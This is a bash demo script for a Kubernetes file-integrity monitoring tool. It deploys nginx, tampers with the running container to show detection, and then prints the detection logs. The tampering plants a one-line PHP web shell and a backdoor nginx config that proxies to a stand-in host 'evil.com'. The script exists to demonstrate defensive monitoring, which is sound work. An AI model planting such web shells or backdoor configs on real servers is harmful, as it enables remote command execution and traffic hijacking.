#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/demo-common.sh
source "${SCRIPT_DIR}/../lib/demo-common.sh"

# ─── Cleanup ─────────────────────────────────────────────────────────
cleanup() {
    step "Cleaning up runtime FIM demo resources"

    info "Deleting nginx deployment and ArgusWatcher..."
    kubectl delete -f "${SCRIPT_DIR}/nginx-monitored.yaml" --ignore-not-found -n "${NAMESPACE}"

    ok "Cleanup complete."
    echo -e "${YELLOW}Note:${NC} Panoptes itself was not uninstalled. Run 'helm uninstall panoptes -n ${PANOPTES_NS}' to remove it."
}

if [[ "${1:-}" == "--cleanup" ]]; then
    cleanup
    exit 0
fi

# ─── Pre-flight check ───────────────────────────────────────────────
panoptes_preflight
panoptes_wait_daemons argusd

# ─── Step 1: Deploy nginx with monitoring ────────────────────────────
step "Step 1/4: Deploying nginx with ArgusWatcher"

demo_deploy "${SCRIPT_DIR}/nginx-monitored.yaml" "deploy/nginx-monitored" "nginx-monitored"

# ─── Step 2: Verify monitoring ──────────────────────────────────────
step "Step 2/4: Verifying ArgusWatcher is active"

demo_init_watches

kubectl get aw nginx-fim -n "${NAMESPACE}" -o wide 2>/dev/null || warn "ArgusWatcher not yet visible"

info "Current nginx.conf content (first 5 lines):"
kubectl exec "${POD}" -n "${NAMESPACE}" -- head -5 /etc/nginx/nginx.conf

info "Current index.html:"
kubectl exec "${POD}" -n "${NAMESPACE}" -- cat /usr/share/nginx/html/index.html | head -5

# ─── Step 3: Simulate violations ────────────────────────────────────
step "Step 3/4: Simulating file integrity violations"

info "Violation 1: Modifying nginx.conf (config tampering)"
kubectl exec "${POD}" -n "${NAMESPACE}" -- sh -c "echo '# injected by attacker: proxy_pass http://evil.com;' >> /etc/nginx/nginx.conf"
ok "Modified /etc/nginx/nginx.conf"

sleep 2

info "Violation 2: Defacing index.html (web content modification)"
kubectl exec "${POD}" -n "${NAMESPACE}" -- sh -c "echo '<html><body><h1>DEFACED BY ATTACKER</h1></body></html>' > /usr/share/nginx/html/index.html"
ok "Modified /usr/share/nginx/html/index.html"

sleep 2

info "Violation 3: Creating a new file in nginx config directory"
kubectl exec "${POD}" -n "${NAMESPACE}" -- sh -c "echo 'location /backdoor { proxy_pass http://evil.com; }' > /etc/nginx/conf.d/backdoor.conf"
ok "Created /etc/nginx/conf.d/backdoor.conf"

sleep 2

info "Violation 4: Creating a web shell in content directory"
kubectl exec "${POD}" -n "${NAMESPACE}" -- sh -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /usr/share/nginx/html/shell.php"
ok "Created /usr/share/nginx/html/shell.php"

# ─── Step 4: Show detections ────────────────────────────────────────
step "Step 4/4: Showing detected events"

demo_propagate

info "ArgusWatcher status:"
kubectl get aw nginx-fim -n "${NAMESPACE}" -o wide 2>/dev/null || true

panoptes_show_logs --tail 25 argusd argus-operator

# ─── Done ────────────────────────────────────────────────────────────
step "Demo complete"

echo -e "
${GREEN}What happened:${NC}
  1. Deployed nginx with an ArgusWatcher monitoring /etc/nginx and /usr/share/nginx/html
  2. The ArgusWatcher registered kernel inotify watches on the container filesystem
  3. We simulated 4 violations:
     - Config tampering    (modified nginx.conf)
     - Content defacement  (overwrote index.html)
     - Backdoor config     (created backdoor.conf)
     - Web shell upload    (created shell.php)
  4. All violations were detected in real-time by the kernel

${GREEN}Key takeaway:${NC}
  Container filesystems should be immutable at runtime.
  Any modification is suspicious and warrants investigation.

${YELLOW}To clean up:${NC}
  ${SCRIPT_DIR}/demo.sh --cleanup
"
